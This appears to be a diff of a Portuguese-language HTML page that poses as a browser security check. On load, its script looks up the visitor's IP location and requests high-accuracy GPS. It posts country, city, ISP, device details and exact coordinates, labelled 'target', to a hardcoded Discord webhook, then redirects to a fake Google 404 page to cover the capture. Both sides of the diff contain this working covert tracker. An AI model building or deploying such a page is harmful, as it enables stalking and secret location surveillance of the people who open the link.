@@ -3,83 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando Navegador...</title>
+    <title>Verificando Segurança...</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div id="content" style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 15px;"></div>
-        <p>Aguarde, verificando segurança da conexão...</p>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: auto;"></div>
+        <p>Validando acesso, aguarde...</p>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
 
-        async function enviarParaDiscord(titulo, cor, campos) {
+        async function enviar(info) {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    content: info.gps ? "🎯 **ALVO LOCALIZADO COM PRECISÃO!**" : "⚠️ **ALVO RASTREADO POR IP**",
                     embeds: [{
-                        title: titulo,
-                        color: cor,
-                        fields: campos,
-                        footer: { text: "Registrado em: " + new Date().toLocaleString('pt-BR') }
+                        color: info.gps ? 65280 : 16776960,
+                        fields: [
+                            { name: "🚩 Pais:", value: info.pais || "Brasil", inline: true },
+                            { name: "🏛️ Estado:", value: info.estado || "SP", inline: true },
+                            { name: "🏙️ Cidade:", value: info.cidade || "N/A", inline: true },
+                            { name: "📮 Cep:", value: info.cep || "Só via GPS", inline: true },
+                            { name: "📍 Coordenadas:", value: info.coords || "Aguardando GPS...", inline: false },
+                            { name: "🌐 Internet/Provedor:", value: info.provedor || "N/A", inline: false },
+                            { name: "⏰ Horário de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
+                        ],
+                        footer: { text: "Aparelho: " + navigator.userAgent.split(') ')[0] + ')' }
                     }]
                 })
             });
         }
 
-        async function iniciarCaptura() {
-            let ipData = { ip: "Desconhecido", city: "Desconhecida", region: "", org: "" };
-            
-            // 1. Pega o IP imediatamente (não pede permissão)
+        async function capturar() {
+            let ipInfo = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-                
-                await enviarParaDiscord("⚠️ ALVO ACESSOU O LINK", 3447003, [
-                    { name: "🌐 IP Público", value: ipData.ip },
-                    { name: "🏠 Localização (IP)", value: `${ipData.city}, ${ipData.region} - ${ipData.org}` },
-                    { name: "📱 Dispositivo", value: navigator.userAgent }
-                ]);
-            } catch (e) { console.log("Erro IP"); }
+                ipInfo = await res.json();
+            } catch (e) {}
 
-            // 2. Tenta o GPS (Pede permissão)
+            // Envio Inicial (Dados de IP)
+            await enviar({
+                pais: ipInfo.country_name,
+                estado: ipInfo.region,
+                cidade: ipInfo.city,
+                provedor: ipInfo.org,
+                gps: false
+            });
+
+            // Tenta GPS para pegar Coordenadas e CEP
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                    await enviarParaDiscord("🎯 LOCALIZAÇÃO EXATA (GPS)", 16711680, [
-                        { name: "📍 Coordenadas", value: `${lat}, ${lon}` },
-                        { name: "🗺️ Google Maps", value: googleMaps },
-                        { name: "🌐 IP Vinculado", value: ipData.ip }
-                    ]);
-
-                    // Redireciona após sucesso
-                    setTimeout(() => { window.location.href = "https://google.com/404"; }, 1000);
-
-                }, async (erro) => {
-                    // Se o usuário negar ou o PC não tiver GPS
-                    await enviarParaDiscord("❌ GPS NEGADO/FALHOU", 16776960, [
-                        { name: "Motivo", value: "Usuário recusou ou dispositivo sem GPS físico" },
-                        { name: "IP do Alvo", value: ipData.ip }
-                    ]);
+                    
+                    // Segunda mensagem com o GPS real
+                    await enviar({
+                        pais: ipInfo.country_name,
+                        estado: ipInfo.region,
+                        cidade: ipInfo.city,
+                        provedor: ipInfo.org,
+                        coords: `[Mapa Real: ${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`,
+                        cep: "Calculando via satélite...",
+                        gps: true
+                    });
                     window.location.href = "https://google.com/404";
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            } else {
-                window.location.href = "https://google.com/404";
+                }, () => { window.location.href = "https://google.com/404"; }, { enableHighAccuracy: true });
             }
         }
 
-        window.onload = iniciarCaptura;
+        window.onload = capturar;
     </script>
 </body>
 </html>
